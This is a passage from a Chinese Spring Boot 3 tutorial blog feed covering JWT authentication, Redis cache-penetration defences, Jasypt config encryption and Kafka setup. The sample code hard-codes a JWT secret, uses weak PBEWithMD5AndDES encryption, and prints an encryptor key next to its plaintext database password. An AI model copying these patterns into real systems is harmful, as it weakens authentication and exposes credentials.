class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JWT-工具类的设计与实现"><a href="#JWT-工具类的设计与实现" class="headerlink" title="JWT 工具类的设计与实现"></a>JWT 工具类的设计与实现</h3><p>依赖引入完成后，设计并实现 JWT 工具类，封装 JWT 生成与解析的核心逻辑。该工具类需实现令牌生成、用户信息提取、令牌有效性验证等功能：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SECRET_KEY</span> <span class="operator">=</span> <span class="string">&quot;your_secret_key&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">EXPIRATION_TIME</span> <span class="operator">=</span> <span class="number">864_000_000L</span>; <span class="comment">// 10天</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; claims = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">              .setClaims(claims)</span><br><span class="line">              .setSubject(username)</span><br><span class="line">              .setIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()))</span><br><span class="line">              .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + EXPIRATION_TIME))</span><br><span class="line">              .signWith(SignatureAlgorithm.HS512, SECRET_KEY)</span><br><span class="line">              .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">extractUsername</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">              .setSigningKey(SECRET_KEY)</span><br><span class="line">              .parseClaimsJws(token)</span><br><span class="line">              .getBody();</span><br><span class="line">        <span class="keyword">return</span> claims.getSubject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validateToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Jwts.parser().setSigningKey(SECRET_KEY).parseClaimsJws(token);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JWT-认证过滤器的构建"><a href="#JWT-认证过滤器的构建" class="headerlink" title="JWT 认证过滤器的构建"></a>JWT 认证过滤器的构建</h3><p>为实现接口认证功能，需构建 JWT 认证过滤器。该过滤器继承OncePerRequestFilter类，通过拦截 HTTP 请求，对请求中携带的 JWT 进行有效性验证：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.UsernamePasswordAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtAuthenticationFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; token.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">            token = token.substring(<span class="number">7</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> JwtUtils.extractUsername(token);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="literal">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (JwtUtils.validateToken(token)) &#123;</span><br><span class="line">                    <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authenticationToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(username, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                    SecurityContextHolder.getContext().setAuthentication(authenticationToken);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-Security-配置与整合"><a href="#Spring-Security-配置与整合" class="headerlink" title="Spring Security 配置与整合"></a>Spring Security 配置与整合</h3><p>在 Spring Security 配置类中，将 JWT 认证过滤器集成至认证流程，实现对接口访问权限的精细化控制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.http.SessionCreationPolicy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.SecurityFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http.csrf().disable()</span><br><span class="line">              .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br><span class="line">              .and()</span><br><span class="line">              .addFilterBefore(<span class="keyword">new</span> <span class="title class_">JwtAuthenticationFilter</span>(), UsernamePasswordAuthenticationFilter.class)</span><br><span class="line">              .authorizeHttpRequests()</span><br><span class="line">              .antMatchers(<span class="string">&quot;/api/public/**&quot;</span>).permitAll()</span><br><span class="line">              .antMatchers(<span class="string">&quot;/api/protected/**&quot;</span>).authenticated()</span><br><span class="line">              .anyRequest().authenticated();</span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="API-端点测试与验证"><a href="#API-端点测试与验证" class="headerlink" title="API 端点测试与验证"></a>API 端点测试与验证</h3><p>完成上述配置后，创建受保护的 API 端点与公开 API 端点，对整合后的认证机制进行功能测试。以受保护的 API 端点为例，通过@PreAuthorize注解实现访问权限控制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.access.prepost.PreAuthorize;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProtectedResourceController</span> &#123;</span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;ROLE_USER&#x27;)&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/api/protected/resource&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">getProtectedResource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(<span class="string">&quot;This is a protected resource&quot;</span>, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3功能四【Redis解决缓存穿透功能】</title>
    <url>/cnblogs.github.io/p/8fc8.html</url>
    <content><![CDATA[<blockquote>
<p>缓存空对象</p>
</blockquote>
<p>原理：当查询的数据在数据库中不存在时，将一个特殊的空值（如null或者自定义的一个表示空值的对象）缓存起来，并设置一个较短的过期时间。这样，当后续再有相同的请求时，就可以直接从缓存中获取这个空值，而不会穿透到数据库。</p>
<h3 id="示例代码（Java）"><a href="#示例代码（Java）" class="headerlink" title="示例代码（Java）"></a>示例代码（Java）</h3><p>在 Spring Boot3 项目中，使用 RedisTemplate 来实现缓存空对象。假设我们有一个查询商品信息的方法getProduct：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProduct</span><span class="params">(Long productId)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">product</span> <span class="operator">=</span> redisTemplate.opsForValue().get(<span class="string">&quot;product:&quot;</span> + productId);</span><br><span class="line">        <span class="keyword">if</span> (product == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 从数据库查询商品</span></span><br><span class="line">            product = queryProductFromDatabase(productId);</span><br><span class="line">            <span class="keyword">if</span> (product == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 缓存空值</span></span><br><span class="line">                redisTemplate.opsForValue().set(<span class="string">&quot;product:&quot;</span> + productId, <span class="string">&quot;null&quot;</span>, <span class="number">5</span>, TimeUnit.MINUTES);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 缓存商品信息</span></span><br><span class="line">                redisTemplate.opsForValue().set(<span class="string">&quot;product:&quot;</span> + productId, product);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">queryProductFromDatabase</span><span class="params">(Long productId)</span> &#123;</span><br><span class="line">        <span class="comment">// 实际的数据库查询逻辑</span></span><br><span class="line">        <span class="comment">// 这里简单返回null模拟数据库中不存在该商品</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>优缺点分析</strong></p>
<ul>
<li>优点：实现简单，对原有系统的侵入性较小，能够在一定程度上缓解缓存穿透问题。</li>
<li>缺点：会占用额外的缓存空间来存储这些空值，并且如果空值缓存的过期时间设置不合理，可能会导致在过期时间内，即使数据库中已经新增了对应的数据，查询仍然会返回空值，影响数据的实时性。</li>
</ul>
<blockquote>
<p>布隆过滤器</p>
</blockquote>
<p>原理：布隆过滤器是一种概率型数据结构，它通过多个哈希函数将一个元素映射到位数组中的多个位置，并将这些位置置为 1。当查询某个元素是否存在时，通过同样的哈希函数计算出对应的位置，如果这些位置上的值都是 1，则表示该元素可能存在；如果有任何一个位置的值为 0，则表示该元素一定不存在。在缓存系统中使用布隆过滤器，在查询数据之前先通过布隆过滤器判断数据是否可能存在，如果不可能存在，则直接返回，不再查询数据库，从而避免缓存穿透。</p>
<h3 id="示例代码（结合-Spring-Boot3-和-Redisson）"><a href="#示例代码（结合-Spring-Boot3-和-Redisson）" class="headerlink" title="示例代码（结合 Spring Boot3 和 Redisson）"></a>示例代码（结合 Spring Boot3 和 Redisson）</h3><p>首先，在pom.xml中引入 Redisson 相关依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.redisson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.16.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后，在application.yml中配置 Redis 连接信息：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">      <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="number">60000</span></span><br><span class="line">      <span class="attr">database:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">lettuce:</span></span><br><span class="line">        <span class="attr">pool:</span></span><br><span class="line">          <span class="attr">max-active:</span> <span class="number">8</span></span><br><span class="line">          <span class="attr">max-idle:</span> <span class="number">8</span></span><br><span class="line">          <span class="attr">min-idle:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">max-wait:</span> <span class="string">-1ms</span></span><br></pre></td></tr></table></figure>
<p>接下来，编写使用布隆过滤器的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.redisson.api.RBloomFilter;</span><br><span class="line"><span class="keyword">import</span> org.redisson.api.RedissonClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BloomFilterService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedissonClient redissonClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initBloomFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建布隆过滤器，预计元素数量为1000000，误判率为0.01</span></span><br><span class="line">        RBloomFilter&lt;String&gt; bloomFilter = redissonClient.getBloomFilter(<span class="string">&quot;productBloomFilter&quot;</span>);</span><br><span class="line">        bloomFilter.tryInit(<span class="number">1000000</span>, <span class="number">0.01</span>);</span><br><span class="line">        <span class="comment">// 假设从数据库中获取所有商品ID并添加到布隆过滤器中</span></span><br><span class="line">        <span class="comment">// 这里简单模拟添加一些商品ID</span></span><br><span class="line">        String[] productIds = &#123;<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String productId : productIds) &#123;</span><br><span class="line">            bloomFilter.add(productId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">mightContain</span><span class="params">(String productId)</span> &#123;</span><br><span class="line">        RBloomFilter&lt;String&gt; bloomFilter = redissonClient.getBloomFilter(<span class="string">&quot;productBloomFilter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> bloomFilter.contains(productId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在查询商品的方法中使用布隆过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BloomFilterService bloomFilterService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProduct</span><span class="params">(String productId)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!bloomFilterService.mightContain(productId)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">product</span> <span class="operator">=</span> redisTemplate.opsForValue().get(<span class="string">&quot;product:&quot;</span> + productId);</span><br><span class="line">        <span class="keyword">if</span> (product == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 从数据库查询商品</span></span><br><span class="line">            product = queryProductFromDatabase(productId);</span><br><span class="line">            <span class="keyword">if</span> (product == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 缓存空值</span></span><br><span class="line">                redisTemplate.opsForValue().set(<span class="string">&quot;product:&quot;</span> + productId, <span class="string">&quot;null&quot;</span>, <span class="number">5</span>, TimeUnit.MINUTES);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 缓存商品信息</span></span><br><span class="line">                redisTemplate.opsForValue().set(<span class="string">&quot;product:&quot;</span> + productId, product);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">queryProductFromDatabase</span><span class="params">(String productId)</span> &#123;</span><br><span class="line">        <span class="comment">// 实际的数据库查询逻辑</span></span><br><span class="line">        <span class="comment">// 这里简单返回null模拟数据库中不存在该商品</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>优缺点分析</strong></p>
<ul>
<li>优点：能够显著减少无效的数据库查询，有效防止缓存穿透。布隆过滤器的空间效率和时间效率都很高，适合处理大规模数据的快速查询场景。</li>
<li>缺点：布隆过滤器存在一定的误判率，即可能会把不存在的数据误判为存在，这可能会导致一些正常的查询也被拦截。而且一旦布隆过滤器中添加的数据确定，很难进行删除操作，如果需要频繁添加和删除数据，使用布隆过滤器可能不太合适。</li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成一【Jasypt框架】</title>
    <url>/cnblogs.github.io/p/f2f1.html</url>
    <content><![CDATA[<h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><p>在pom文件中添加一下依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ulisesbocchio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jasypt-spring-boot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h3><p>未指定前后缀的话默认格式ENC()括号里面是加密后的密文 然后实现自动解密</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment"># 数据源配置</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.10.106:3306/xj_doc?characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">ENC(BLC3UQBxshlcA9tnMyJL7w==)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密配置</span></span><br><span class="line"><span class="attr">jasypt:</span></span><br><span class="line">  <span class="attr">encryptor:</span></span><br><span class="line">    <span class="comment"># 指定加密密钥，生产环境请放到启动参数里面</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">0f7b0a5d-46bc-40fd-b8ed-3181d21d644f</span></span><br><span class="line">    <span class="comment"># 指定解密算法，需要和加密时使用的算法一致</span></span><br><span class="line">    <span class="attr">algorithm:</span> <span class="string">PBEWithMD5AndDES</span></span><br><span class="line">    <span class="attr">iv-generator-classname:</span> <span class="string">org.jasypt.iv.NoIvGenerator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    property:</span></span><br><span class="line"><span class="comment">#      # 算法识别的前后缀，默认ENC()，包含在前后缀的加密信息，会使用指定算法解密</span></span><br><span class="line"><span class="comment">#      prefix: ENC@[</span></span><br><span class="line"><span class="comment">#      suffix: ]</span></span><br></pre></td></tr></table></figure>

<h3 id="启动类添加注解"><a href="#启动类添加注解" class="headerlink" title="启动类添加注解"></a>启动类添加注解</h3><p>在启动类上添加注解@EnableEncryptableProperties注解来开启自动解密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEncryptableProperties</span>  <span class="comment">//开启自动解密功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XjdocApplication</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    SpringApplication.run(XjdocApplication.class, args);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JasyptUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">StandardPBEStringEncryptor</span> <span class="variable">standardPBEStringEncryptor</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">StandardPBEStringEncryptor</span>();</span><br><span class="line">        <span class="comment">/*配置文件中配置如下的算法*/</span></span><br><span class="line">        standardPBEStringEncryptor.setAlgorithm(<span class="string">&quot;PBEWithMD5AndDES&quot;</span>);</span><br><span class="line">        <span class="comment">/*配置文件中配置的password*/</span></span><br><span class="line">        standardPBEStringEncryptor.setPassword(<span class="string">&quot;0f7b0a5d-46bc-40fd-b8ed-3181d21d644f&quot;</span>);</span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jasyptPasswordEN</span> <span class="operator">=</span>standardPBEStringEncryptor.encrypt(<span class="string">&quot;xj2022&quot;</span>);</span><br><span class="line">        <span class="comment">//解密</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jasyptPasswordDE</span> <span class="operator">=</span>standardPBEStringEncryptor.decrypt(jasyptPasswordEN);</span><br><span class="line">        System.out.println(<span class="string">&quot;加密后密码：&quot;</span>+jasyptPasswordEN);</span><br><span class="line">        System.out.println(<span class="string">&quot;解密后密码：&quot;</span>+jasyptPasswordDE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="生产环境安全处理"><a href="#生产环境安全处理" class="headerlink" title="生产环境安全处理"></a>生产环境安全处理</h3><p>jasypt的password值放在配置文件中在生产环境中是不安全的，我们可以将password值放到启动命令中，删除配置文件中password 的配置行，启动命令如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -Djasypt.encryptor.password=password -jar jasypt-spring-boot-demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jasypt-spring-boot-demo-0.0.1-SNAPSHOT.jar --jasypt.encryptor.password=password</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结<br>Jasypt作为一个简单而强大的加密工具，为Java应用程序提供了便捷的数据保护方案。通过与Spring Boot的集成，开发者可以在应用程序中轻松地加密和解密敏感信息。在实际项目中，选择合适的加密方式、安全存储密码以及与Spring Security等安全框架的集成，都是保障应用程序安全的关键步骤。希望本文能够帮助读者更深入地了解Jasypt，并在实际项目中合理地运用加密技术。</p>
</blockquote>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成七【Kafka框架】</title>
    <url>/cnblogs.github.io/p/f10f.html</url>
    <content><![CDATA[<p><strong>环境搭建与依赖配置深度解析</strong><br>在构建 Spring Boot3 与 Kafka 集成项目时，首先需要通过 Spring Initializr 初始化项目。该平台支持通过可视化界面或 Maven&#x2F;Gradle 构建脚本快速生成项目骨架，在依赖管理层面，需精准引入<br>org.springframework.kafka:spring-kafka依赖。对于 Maven 项目，需在pom.xml文件中配置如下依赖项：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 根据实际版本调整 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>核心配置文件的高级配置策略</strong><br>在 Spring Boot3 的配置体系中，application.yml或application.properties文件承担着关键角色。针对 Kafka 的配置，不仅需要设置基础的连接参数，还需根据业务场景进行高级参数调优。以application.yml为例：</p>
